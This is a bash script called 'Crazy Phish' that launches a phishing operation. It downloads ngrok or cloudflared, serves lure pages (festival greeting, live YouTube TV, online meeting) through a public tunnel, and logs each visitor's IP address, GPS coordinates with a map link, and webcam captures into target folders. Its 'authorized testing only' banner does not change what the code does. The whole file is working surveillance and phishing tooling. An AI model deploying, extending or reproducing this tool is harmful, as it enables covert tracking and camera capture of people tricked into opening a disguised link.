#!/bin/bash
# Crazy Phish v1.0
# Powered by prakeerth
# Instagram: @mr_lotta_1.0
# Purpose: Authorized penetration testing and security assessment
# ⚠️  FOR AUTHORIZED SECURITY TESTING ONLY - NO ILLEGAL USE

# Windows compatibility check
if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
  windows_mode=true
  echo "Windows system detected. Some commands will be adapted for Windows compatibility."
  
  function killall() {
    taskkill /F /IM "$1" 2>/dev/null
  }
  
  function pkill() {
    if [[ "$1" == "-f" ]]; then
      shift
      shift
      taskkill /F /FI "IMAGENAME eq $1" 2>/dev/null
    else
      taskkill /F /IM "$1" 2>/dev/null
    fi
  }
else
  windows_mode=false
fi

trap 'printf "\n";stop' 2

# Clean, professional banner
banner() {
clear
printf "\n"
printf "\e[1;91m██████╗ ██████╗  █████╗ ██╗  ██╗███████╗███████╗██████╗ ████████╗\e[0m\n"
printf "\e[1;91m██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔════╝██╔══██╗╚══██╔══╝\e[0m\n"
printf "\e[1;95m██████╔╝██████╔╝███████║█████╔╝ █████╗  █████╗  ██████╔╝   ██║   \e[0m\n"
printf "\e[1;95m██╔═══╝ ██╔══██╗██╔══██║██╔═██╗ ██╔══╝  ██╔══╝  ██╔══██╗   ██║   \e[0m\n"
printf "\e[1;96m██║     ██║  ██║██║  ██║██║  ██╗███████╗███████╗██║  ██║   ██║   \e[0m\n"
printf "\e[1;96m╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝   ╚═╝   \e[0m\n"
printf "\n"
printf " \e[1;93m════════════════════════════════════════════════════════════════════════════\e[0m\n"
printf " \e[1;97m            CRAZY WEB PHISH v1.0 - Authorized Security Testing Tool \e[0m\n"
printf " \e[1;93m════════════════════════════════════════════════════════════════════════════\e[0m\n"
printf "\n"
printf " \e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mAuthor: \e[1;93mprakeerth\e[0m\n"
printf " \e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mInstagram: \e[1;95m@mr_lotta_1.0\e[0m\n"
printf " \e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mPurpose: \e[1;92mAuthorized Security Testing\e[0m\n"
printf " \e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mStatus: \e[1;92mPERMISSION GRANTED\e[0m\n"
printf "\n"
printf " \e[1;90m════════════════════════════════════════════════════════════════════════════\e[0m\n"
printf "\n"
}

# Dependencies check
dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}

# Stop function
stop() {
printf "\n\e[1;91m[!] Stopping Crazy Phish...\e[0m\n"
if [[ "$windows_mode" == true ]]; then
  taskkill /F /IM "ngrok.exe" 2>/dev/null
  taskkill /F /IM "php.exe" 2>/dev/null
  taskkill /F /IM "cloudflared.exe" 2>/dev/null
else
  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
  checkphp=$(ps aux | grep -o "php" | head -n1)
  checkcloudflaretunnel=$(ps aux | grep -o "cloudflared" | head -n1)

  if [[ $checkngrok == *'ngrok'* ]]; then
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
  fi

  if [[ $checkphp == *'php'* ]]; then
    killall -2 php > /dev/null 2>&1
  fi

  if [[ $checkcloudflaretunnel == *'cloudflared'* ]]; then
    pkill -f -2 cloudflared > /dev/null 2>&1
    killall -2 cloudflared > /dev/null 2>&1
  fi
fi

printf "\e[1;92m[+] Crazy Phish stopped successfully!\e[0m\n"
exit 1
}

# IP capture
catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mTARGET IP:\e[0m\e[1;92m %s\e[0m\n" $ip
cat ip.txt >> saved_targets.txt
}

# Location capture
catch_location() {
  if [[ -e "current_location.txt" ]]; then
    printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mLOCATION DATA RECEIVED:\e[0m\n"
    grep -v -E "Location data sent|getLocation called|Geolocation error|Location permission denied" current_location.txt
    printf "\n"
    mv current_location.txt current_location.bak
  fi

  if [[ -e "location_"* ]]; then
    location_file=$(ls location_* | head -n 1)
    lat=$(grep -a 'Latitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    lon=$(grep -a 'Longitude:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    acc=$(grep -a 'Accuracy:' "$location_file" | cut -d " " -f2 | tr -d '\r')
    maps_link=$(grep -a 'Google Maps:' "$location_file" | cut -d " " -f3 | tr -d '\r')
    
    printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mLATITUDE:\e[0m\e[1;92m %s\e[0m\n" $lat
    printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mLONGITUDE:\e[0m\e[1;92m %s\e[0m\n" $lon
    printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mACCURACY:\e[0m\e[1;92m %s meters\e[0m\n" $acc
    printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mGOOGLE MAPS:\e[0m\e[1;92m %s\e[0m\n" $maps_link
    
    if [[ ! -d "target_locations" ]]; then
      mkdir -p target_locations
    fi
    
    mv "$location_file" target_locations/
    printf "\e[1;92m[+] Location saved to target_locations/%s\e[0m\n" "$location_file"
  else
    printf "\e[1;93m[!] No location data found yet...\e[0m\n"
  fi
}

# Check for targets
checkfound() {
if [[ ! -d "target_locations" ]]; then
  mkdir -p target_locations
fi

printf "\n"
printf "\e[1;91m[\e[0m\e[1;97m*\e[0m\e[1;91m] \e[1;97mCRAZY PHISH IS ACTIVE - WAITING FOR TARGETS...\e[0m\n"
printf "\e[1;91m[\e[0m\e[1;97m*\e[0m\e[1;91m] \e[1;97mGPS Location tracking: \e[1;92mACTIVE\e[0m\n"
while [ true ]; do

if [[ -e "ip.txt" ]]; then
printf "\n\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mTARGET ACTIVATED THE PHISHING LINK!\e[0m\n"
catch_ip
rm -rf ip.txt
fi

sleep 0.5

if [[ -e "current_location.txt" ]]; then
printf "\n\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mLOCATION DATA RECEIVED!\e[0m\n"
catch_location
fi

if [[ -e "LocationLog.log" ]]; then
printf "\n\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mLOCATION DATA RECEIVED!\e[0m\n"
catch_location
rm -rf LocationLog.log
fi

if [[ -e "LocationError.log" ]]; then
rm -rf LocationError.log
fi

if [[ -e "Log.log" ]]; then
printf "\n\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mCAM CAPTURE FILE RECEIVED!\e[0m\n"
rm -rf Log.log
fi
sleep 0.5
done 
}

# Cloudflare tunnel function
cloudflare_tunnel() {
if [[ -e cloudflared ]] || [[ -e cloudflared.exe ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mDownloading Cloudflared...\e[0m\n"

# Detect architecture
arch=$(uname -m)
os=$(uname -s)
printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mDetected OS: $os, Architecture: $arch\e[0m\n"

# Windows detection
if [[ "$windows_mode" == true ]]; then
    printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mWindows detected, downloading Windows binary...\e[0m\n"
    wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe -O cloudflared.exe > /dev/null 2>&1
    if [[ -e cloudflared.exe ]]; then
        chmod +x cloudflared.exe
        echo '#!/bin/bash' > cloudflared
        echo './cloudflared.exe "$@"' >> cloudflared
        chmod +x cloudflared
    else
        printf "\e[1;91m[!] Download error... \e[0m\n"
        exit 1
    fi
else
    # macOS detection
    if [[ "$os" == "Darwin" ]]; then
        printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mmacOS detected...\e[0m\n"
        if [[ "$arch" == "arm64" ]]; then
            printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mApple Silicon (M1/M2/M3) detected...\e[0m\n"
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64.tgz -O cloudflared.tgz > /dev/null 2>&1
        else
            printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mIntel Mac detected...\e[0m\n"
            wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz -O cloudflared.tgz > /dev/null 2>&1
        fi
        
        if [[ -e cloudflared.tgz ]]; then
            tar -xzf cloudflared.tgz > /dev/null 2>&1
            chmod +x cloudflared
            rm cloudflared.tgz
        else
            printf "\e[1;91m[!] Download error... \e[0m\n"
            exit 1
        fi
    # Linux and other Unix-like systems
    else
        case "$arch" in
            "x86_64")
                printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mx86_64 architecture detected...\e[0m\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
                ;;
            "i686"|"i386")
                printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mx86 32-bit architecture detected...\e[0m\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1
                ;;
            "aarch64"|"arm64")
                printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mARM64 architecture detected...\e[0m\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
                ;;
            "armv7l"|"armv6l"|"arm")
                printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mARM architecture detected...\e[0m\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
                ;;
            *)
                printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mArchitecture not specifically detected ($arch), defaulting to amd64...\e[0m\n"
                wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
                ;;
        esac
        
        if [[ -e cloudflared ]]; then
            chmod +x cloudflared
        else
            printf "\e[1;91m[!] Download error... \e[0m\n"
            exit 1
        fi
    fi
fi
fi

printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mStarting php server...\e[0m\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mStarting Cloudflare tunnel...\e[0m\n"
rm -rf .cloudflared.log > /dev/null 2>&1 &

if [[ "$windows_mode" == true ]]; then
    ./cloudflared.exe tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
else
    ./cloudflared tunnel -url 127.0.0.1:3333 --logfile .cloudflared.log > /dev/null 2>&1 &
fi

sleep 10
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
if [[ -z "$link" ]]; then
printf "\e[1;91m[!] Direct link is not generating, check following possible reasons:\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;97m*\e[0m\e[1;92m] \e[1;93mCloudFlare tunnel service might be down\n"
printf "\e[1;92m[\e[0m\e[1;97m*\e[0m\e[1;92m] \e[1;93mIf you are using android, turn hotspot on\n"
printf "\e[1;92m[\e[0m\e[1;97m*\e[0m\e[1;92m] \e[1;93mCloudFlared is already running, run this command killall cloudflared\n"
printf "\e[1;92m[\e[0m\e[1;97m*\e[0m\e[1;92m] \e[1;93mCheck your internet connection\n"
exit 1
else
printf "\e[1;92m[\e[0m\e[1;97m*\e[0m\e[1;92m] \e[1;97mDirect link:\e[0m\e[1;93m %s\e[0m\n" $link
fi
payload_cloudflare
checkfound
}

payload_cloudflare() {
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cloudflared.log")
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
else
sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
fi
rm -rf index3.html
}

ngrok_server() {
if [[ -e ngrok ]] || [[ -e ngrok.exe ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mDownloading Ngrok...\e[0m\n"

# Detect architecture
arch=$(uname -m)
os=$(uname -s)
printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mDetected OS: $os, Architecture: $arch\e[0m\n"

# Windows detection
if [[ "$windows_mode" == true ]]; then
    printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mWindows detected, downloading Windows binary...\e[0m\n"
    wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip -O ngrok.zip > /dev/null 2>&1
    if [[ -e ngrok.zip ]]; then
        unzip ngrok.zip > /dev/null 2>&1
        chmod +x ngrok.exe
        rm -rf ngrok.zip
    else
        printf "\e[1;91m[!] Download error... \e[0m\n"
        exit 1
    fi
else
    # macOS detection
    if [[ "$os" == "Darwin" ]]; then
        printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mmacOS detected...\e[0m\n"
        if [[ "$arch" == "arm64" ]]; then
            printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mApple Silicon (M1/M2/M3) detected...\e[0m\n"
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-arm64.zip -O ngrok.zip > /dev/null 2>&1
        else
            printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mIntel Mac detected...\e[0m\n"
            wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-darwin-amd64.zip -O ngrok.zip > /dev/null 2>&1
        fi
        
        if [[ -e ngrok.zip ]]; then
            unzip ngrok.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok.zip
        else
            printf "\e[1;91m[!] Download error... \e[0m\n"
            exit 1
        fi
    # Linux and other Unix-like systems
    else
        case "$arch" in
            "x86_64")
                printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mx86_64 architecture detected...\e[0m\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "i686"|"i386")
                printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mx86 32-bit architecture detected...\e[0m\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "aarch64"|"arm64")
                printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mARM64 architecture detected...\e[0m\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            "armv7l"|"armv6l"|"arm")
                printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mARM architecture detected...\e[0m\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.zip -O ngrok.zip > /dev/null 2>&1
                ;;
            *)
                printf "\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mArchitecture not specifically detected ($arch), defaulting to amd64...\e[0m\n"
                wget --no-check-certificate https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip -O ngrok.zip > /dev/null 2>&1
                ;;
        esac
        
        if [[ -e ngrok.zip ]]; then
            unzip ngrok.zip > /dev/null 2>&1
            chmod +x ngrok
            rm -rf ngrok.zip
        else
            printf "\e[1;91m[!] Download error... \e[0m\n"
            exit 1
        fi
    fi
fi
fi

# Ngrok auth token handling
if [[ "$windows_mode" == true ]]; then
    if [[ -e "$USERPROFILE\.ngrok2\ngrok.yml" ]]; then
        printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
        cat "$USERPROFILE\.ngrok2\ngrok.yml"
        read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
            ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
            printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
        fi
    else
        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
        ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
    fi
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
    ./ngrok.exe http 3333 > /dev/null 2>&1 &
else
    if [[ -e ~/.ngrok2/ngrok.yml ]]; then
        printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
        cat  ~/.ngrok2/ngrok.yml
        read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
        if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
            read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
            ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
            printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
        fi
    else
        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
        ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
    fi
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
    php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
    sleep 2
    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
    ./ngrok http 3333 > /dev/null 2>&1 &
fi

sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running ngrok manually: ./ngrok http 3333\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
payload_ngrok
checkfound
}

payload_ngrok() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
sed 's+forwarding_link+'$link'+g' template.php > index.php
if [[ $option_tem -eq 1 ]]; then
sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
elif [[ $option_tem -eq 2 ]]; then
sed 's+forwarding_link+'$link'+g' LiveYTTV.html > index3.html
sed 's+live_yt_tv+'$yt_video_ID'+g' index3.html > index2.html
else
sed 's+forwarding_link+'$link'+g' OnlineMeeting.html > index2.html
fi
rm -rf index3.html
}

# Crazy Phish main function
crazy_phish() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

printf "\n"
printf " \e[1;93m════════════════════════════════════════════════════════════════════════════\e[0m\n"
printf " \e[1;97m                     SELECT TUNNELING SERVICE \e[0m\n"
printf " \e[1;93m════════════════════════════════════════════════════════════════════════════\e[0m\n"
printf "\n"
printf "\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;97m Ngrok\e[0m\n"
printf "\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;97m CloudFlare Tunnel\e[0m\n"
default_option_server="1"
read -p $'\n\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mChoose a Port Forwarding option: [Default is 1] \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
select_template

if [[ $option_server -eq 2 ]]; then
cloudflare_tunnel
elif [[ $option_server -eq 1 ]]; then
ngrok_server
else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
crazy_phish
fi
}

select_template() {
if [ $option_server -gt 2 ] || [ $option_server -lt 1 ]; then
printf "\e[1;93m [!] Invalid tunnel option! try again\e[0m\n"
sleep 1
clear
banner
crazy_phish
else
printf "\n"
printf " \e[1;93m════════════════════════════════════════════════════════════════════════════\e[0m\n"
printf " \e[1;97m                     SELECT PHISHING TEMPLATE \e[0m\n"
printf " \e[1;93m════════════════════════════════════════════════════════════════════════════\e[0m\n"
printf "\n"
printf "\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;97m Festival Wishing\e[0m\n"
printf "\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;97m Live YouTube TV\e[0m\n"
printf "\e[1;91m[\e[0m\e[1;97m03\e[0m\e[1;91m]\e[0m\e[1;97m Online Meeting\e[0m\n"
default_option_template="1"
read -p $'\n\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mChoose a template: [Default is 1] \e[0m' option_tem
option_tem="${option_tem:-${default_option_template}}"
if [[ $option_tem -eq 1 ]]; then
read -p $'\n\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mEnter festival name: \e[0m' fest_name
fest_name="${fest_name//[[:space:]]/}"
elif [[ $option_tem -eq 2 ]]; then
read -p $'\n\e[1;91m[\e[0m\e[1;97m+\e[0m\e[1;91m] \e[1;97mEnter YouTube video watch ID: \e[0m' yt_video_ID
elif [[ $option_tem -eq 3 ]]; then
printf ""
else
printf "\e[1;93m [!] Invalid template option! try again\e[0m\n"
sleep 1
select_template
fi
fi
}

# Initialize Crazy Phish
banner
dependencies
crazy_phish
